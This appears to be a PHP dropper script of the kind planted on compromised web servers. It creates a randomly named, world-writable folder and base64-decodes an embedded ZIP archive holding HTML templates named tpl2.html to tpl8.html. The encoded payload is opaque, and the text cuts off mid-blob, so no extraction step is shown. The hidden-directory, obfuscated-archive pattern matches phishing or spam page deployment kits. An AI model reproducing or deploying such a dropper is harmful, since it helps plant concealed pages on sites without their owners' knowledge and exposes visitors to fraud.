<?php

$let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    

$myfilename = "z1";

$foldername='';     
for ($ns=1;$ns<rand(8,8);$ns++)     
{     
$r = rand (0,count($let)-1);     
$foldername .= $let[$r];     
}  
mkdir($foldername, 0777);

$data = base64_decode("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